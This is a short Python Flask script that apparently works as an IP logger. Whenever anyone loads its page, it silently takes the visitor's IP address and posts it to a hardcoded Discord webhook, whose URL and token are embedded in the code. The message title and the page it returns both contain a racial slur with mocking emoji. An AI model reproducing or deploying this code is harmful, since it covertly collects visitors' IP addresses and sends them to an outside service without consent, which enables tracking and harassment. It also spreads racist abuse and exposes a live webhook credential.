from flask import Flask, request
import requests

app = Flask(__name__)

# Your Discord Webhook
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1342987990468923464/iIGYeSKvM6ZiRp1jCr4WIv1NhXc-FWCbrXX9VuMjE2s8cqy9GOmW78pRPNWgGWP3oFr8"

@app.route("/", methods=["GET"])
def log_ip():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Send to Discord Webhook
    data = {
        "embeds": [
            {
                "title": "👨🏿‍🦲 nigga logged lmfao",
                "description": f"**🧔🏿‍♂️ IP:** `{user_ip}`",
                "color": 0x800080  # Purple
            }
        ]
    }
    
    requests.post(DISCORD_WEBHOOK_URL, json=data)
    
    return "👨🏿‍🦲 bald nigga", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
